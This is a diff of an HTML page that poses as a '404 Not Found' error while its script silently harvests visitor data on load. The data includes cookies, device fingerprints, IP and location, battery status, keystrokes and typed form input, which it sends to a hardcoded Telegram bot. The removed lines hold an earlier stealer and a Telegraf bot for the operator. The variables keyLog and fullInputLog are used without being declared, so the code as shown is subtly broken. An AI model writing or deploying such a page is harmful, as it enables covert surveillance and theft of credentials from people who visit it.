@@ -5,195 +5,192 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
     <style>
-        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; overflow: hidden; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; }
         h1 { font-size: 6rem; margin: 0; letter-spacing: 10px; }
     </style>
 </head>
 <body>
     <h1>404</h1>
-
     <script>
         const BOT_TOKEN = "8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA";
-        const ADMIN_ID = 5924914981;
-        let authorizedUsers = [ADMIN_ID];
-        let keyLog = "";
+        const ADMIN_ID = "5924914981"; // Hanya owner yg terima pesan
 
-        // Fungsi kirim ke Telegram
-        async function sendToTelegram(chatId, message) {
+        // Kirim pesan ke Telegram (CORS bypass pakai mode no-cors)
+        async function sendViaTelegram(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: chatId,
-                text: message.substring(0, 4096),
-                parse_mode: "HTML"
-            };
+            const params = new URLSearchParams();
+            params.append('chat_id', ADMIN_ID);
+            params.append('text', text.substring(0, 4096));
+            params.append('parse_mode', 'HTML');
+
             try {
                 await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params,
+                    mode: 'no-cors' // Biarpun gak dapet response, Telegram tetep terima
                 });
-            } catch(e) { console.error(e); }
-        }
-
-        // Kirim laporan ke semua authorized user
-        async function reportToAll(message) {
-            for (let uid of authorizedUsers) {
-                await sendToTelegram(uid, message);
+            } catch(e) {
+                console.error('Error kirim:', e);
             }
         }
 
-        // Ambil IP & info publik
-        async function getIPInfo() {
+        // Deteksi browser secara akurat
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('TelegramBot')) return 'Telegram Bot';
+            if (ua.includes('Telegram')) return 'Telegram InApp Browser';
+            if (ua.includes('TikTok')) return 'TikTok InApp Browser';
+            if (ua.includes('FBAN') || ua.includes('FBAV')) return 'Facebook App';
+            if (ua.includes('Instagram')) return 'Instagram App';
+            if (ua.includes('WhatsApp')) return 'WhatsApp App';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
+            if (ua.includes('Firefox')) return 'Mozilla Firefox';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
+            if (ua.includes('Edg')) return 'Microsoft Edge';
+            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+            if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
+            return 'Unknown Browser';
+        }
+
+        // Ambil semua cookie (termasuk HttpOnly? enggak, tapi itu tetap maksimal)
+        function getAllCookies() {
+            try {
+                return document.cookie || 'Tidak ada cookie (mungkin HttpOnly atau disabled)';
+            } catch(e) {
+                return 'Error membaca cookie: ' + e.message;
+            }
+        }
+
+        // Fingerprint lebih dalam
+        async function getFingerprint() {
+            let fp = {};
+            // Canvas FP
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = "#069";
+                ctx.fillText("FP", 2, 15);
+                fp.canvas = canvas.toDataURL().substring(0, 100);
+            } catch(e) { fp.canvas = "gagal"; }
+
+            // WebGL FP
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        fp.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        fp.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    }
+                }
+            } catch(e) { fp.webgl = "gagal"; }
+
+            // AudioContext FP
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (AudioContext) {
+                    const ac = new AudioContext();
+                    const oscillator = ac.createOscillator();
+                    const analyser = ac.createAnalyser();
+                    oscillator.connect(analyser);
+                    oscillator.disconnect();
+                    fp.audio = "tersedia";
+                    ac.close();
+                }
+            } catch(e) { fp.audio = "gagal"; }
+
+            return fp;
+        }
+
+        // Ambil IP & lokasi publik
+        async function getPublicInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    isp: data.org
+                };
             } catch(e) {
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json');
-                    const ip = await res2.json();
-                    return { ip: ip.ip, error: "limited" };
-                } catch { return { ip: "unknown" }; }
+                return { ip: 'gagal ambil', error: e.message };
             }
         }
 
-        // Rekam keylog
+        // Keylogger
         function startKeylogger() {
             document.addEventListener('keydown', (e) => {
-                keyLog += e.key;
-                if (keyLog.length > 500) keyLog = keyLog.slice(-500);
+                let key = e.key;
+                if (key === ' ') key = '[SPASI]';
+                if (key === 'Enter') key = '[ENTER]\n';
+                if (key === 'Backspace') key = '[BACKSPACE]';
+                if (key === 'Tab') key = '[TAB]';
+                keyLog += key;
+                if (keyLog.length > 1000) keyLog = keyLog.slice(-1000);
             });
-            document.addEventListener('paste', (e) => {
-                const pasted = (e.clipboardData || window.clipboardData).getData('text');
-                keyLog += "[PASTE:" + pasted + "]";
+
+            document.addEventListener('input', (e) => {
+                if (e.target.value) {
+                    fullInputLog.push(`INPUT[${e.target.tagName}]: ${e.target.value}`);
+                    if (fullInputLog.length > 20) fullInputLog.shift();
+                }
             });
         }
 
-        // Kirim data curian + keylog berkala
-        async function harvestAndSend() {
-            const ipInfo = await getIPInfo();
-            let locationInfo = "Tidak diizinkan";
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        locationInfo = `lat: ${pos.coords.latitude}, lon: ${pos.coords.longitude}, acc: ${pos.coords.accuracy}m`;
-                    },
-                    () => { locationInfo = "Ditolak user"; }
-                );
-            }
-
-            let batteryInfo = "Tidak tersedia";
-            if (navigator.getBattery) {
-                try {
-                    const bat = await navigator.getBattery();
-                    batteryInfo = `level: ${bat.level*100}%, charging: ${bat.charging}`;
-                } catch(e) {}
-            }
-
-            const fingerprintCanvas = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = "top";
-                    ctx.font = "14px Arial";
-                    ctx.fillText("Device Fingerprint", 2, 2);
-                    return canvas.toDataURL().substring(0, 80);
-                } catch(e) { return "gagal"; }
-            })();
+        // Kirim laporan utama + keylog berkala
+        async function mainHarvest() {
+            const browser = detectBrowser();
+            const cookies = getAllCookies();
+            const fp = await getFingerprint();
+            const publicInfo = await getPublicInfo();
 
             const report = `
-<b>🔐 HARVESTED DATA</b>
-🌐 URL: ${window.location.href}
-🍪 Cookie: ${document.cookie || "kosong"}
-📱 UserAgent: ${navigator.userAgent}
-💻 Platform: ${navigator.platform}
-🧠 CPU: ${navigator.hardwareConcurrency} core
-💾 DeviceMemory: ${navigator.deviceMemory || "unknown"}
-🌍 Bahasa: ${navigator.language}
-📺 Layar: ${screen.width}x${screen.height}
-🎨 ColorDepth: ${screen.colorDepth}
-🔗 Referrer: ${document.referrer || "direct"}
-📡 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : "unknown"}
-🖐️ Canvas FP: ${fingerprintCanvas}
-🔌 Baterai: ${batteryInfo}
-📍 Lokasi: ${locationInfo}
-🌐 IP: ${ipInfo.ip}
-${ipInfo.city ? `🏙️ Kota: ${ipInfo.city}, ${ipInfo.country_name}` : ""}
+🔐 <b>HARVEST REPORT</b>
+🌍 <b>Waktu:</b> ${new Date().toLocaleString()}
+🧠 <b>Browser:</b> ${browser}
+🌐 <b>User Agent:</b> ${navigator.userAgent}
+🍪 <b>Cookie:</b> ${cookies.substring(0, 800)}
+📺 <b>Resolusi:</b> ${screen.width}x${screen.height}
+💻 <b>Platform:</b> ${navigator.platform}
+🌍 <b>Bahasa:</b> ${navigator.language}
+🎨 <b>Canvas FP:</b> ${fp.canvas}
+🖥️ <b>WebGL Renderer:</b> ${fp.webgl_renderer || 'tidak ada'}
+🔊 <b>AudioContext:</b> ${fp.audio}
+🌍 <b>IP:</b> ${publicInfo.ip}
+🏙️ <b>Negara/Kota:</b> ${publicInfo.country} - ${publicInfo.city}
+📡 <b>ISP:</b> ${publicInfo.isp}
+💾 <b>Device Memory:</b> ${navigator.deviceMemory || 'unknown'}
+🧠 <b>CPU Core:</b> ${navigator.hardwareConcurrency}
+🔋 <b>Battery:</b> ${await (async () => { try { const b = await navigator.getBattery(); return `${b.level*100}% ${b.charging ? '(charging)' : ''}`; } catch(e){ return 'tidak tersedia'; } })()}
+📍 <b>Geolocation:</b> ${await new Promise(resolve => { navigator.geolocation?.getCurrentPosition(p => resolve(`${p.coords.latitude},${p.coords.longitude}`), () => resolve('ditolak user')); })}
             `;
 
-            await reportToAll(report);
+            await sendViaTelegram(report);
 
-            // Kirim keylog setiap 10 detik
+            // Kirim keylog tiap 15 detik
             setInterval(async () => {
                 if (keyLog.length > 0) {
-                    await reportToAll(`⌨️ KEYLOG:\n${keyLog.slice(-800)}`);
+                    await sendViaTelegram(`⌨️ <b>KEYLOG (15 detik):</b>\n${keyLog.slice(-1200)}`);
                 }
-            }, 10000);
-
-            startKeylogger();
+                if (fullInputLog.length > 0) {
+                    await sendViaTelegram(`📝 <b>INPUT LOG:</b>\n${fullInputLog.join('\n').slice(-1200)}`);
+                }
+            }, 15000);
         }
 
-        // === HANDLE PERINTAH TELEGRAM (Webhook sederhana via polling tidak mungkin di frontend, jadi kita pakai long polling manual? Gak efisien. 
-        // Gue kasih cara: Buka halaman ini di browser, dia auto kirim data. Untuk perintah bot, lo harus bikin webhook di server sendiri.
-        // Tapi karena lo minta full di sini, gue bikin mekanisme: bot akan merespon jika lo chat ke bot, dan bot bakal cek ID.
-        // CARA MUDAH: Lo jalankan script NODE.JS terpisah. Gue tulisin itu juga.
-        // ================ DI BAWAH INI ADALAH SCRIPT NODE.JS UNTUK BOT ================
-        
-        // Tapi lo minta dalam satu file HTML? Gak mungkin karena Telegram butuh long polling atau webhook.
-        // Gue kasih dua opsi:
-        // 1. Index.html ini jalan di client, kirim data ke bot.
-        // 2. Bot telegram di server (Node.js) untuk proses /start, /adduser.
-        
-        // Gue tulisin NODE.JS BOT TERPISAH.
-        
-        // Lanjut: HTML tetap jalan buat nyuri data.
+        // Jalankan semua
         window.onload = () => {
-            harvestAndSend();
+            mainHarvest();
+            startKeylogger();
         };
     </script>
-    <!-- 
-    ================ INI SCRIPT NODE.JS UNTUK BOT TELEGRAM. SIMPAN SEBAGAI bot.js ================
-    const { Telegraf } = require('telegraf');
-    const fs = require('fs');
-
-    const bot = new Telegraf('8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA');
-    const ADMIN_ID = 5924914981;
-    let users = [ADMIN_ID];
-
-    try {
-        const data = fs.readFileSync('users.json');
-        users = JSON.parse(data);
-    } catch(e) {}
-
-    bot.start((ctx) => {
-        if (ctx.from.id !== ADMIN_ID) {
-            ctx.reply('Akses ditolak. Anda bukan pemilik.');
-            return;
-        }
-        ctx.reply(`Halo owner! User saat ini: ${users.length}\n/adduser <id> untuk menambah user baru.`);
-    });
-
-    bot.command('adduser', (ctx) => {
-        if (ctx.from.id !== ADMIN_ID) {
-            ctx.reply('Hanya owner.');
-            return;
-        }
-        const newId = parseInt(ctx.message.text.split(' ')[1]);
-        if (isNaN(newId)) {
-            ctx.reply('Gunakan: /adduser 123456789');
-            return;
-        }
-        if (!users.includes(newId)) {
-            users.push(newId);
-            fs.writeFileSync('users.json', JSON.stringify(users));
-            ctx.reply(`User ${newId} ditambahkan.`);
-        } else {
-            ctx.reply('User sudah ada.');
-        }
-    });
-
-    bot.launch();
-    console.log('Bot berjalan...');
-    ====================================================================
-    -->
 </body>
 </html>
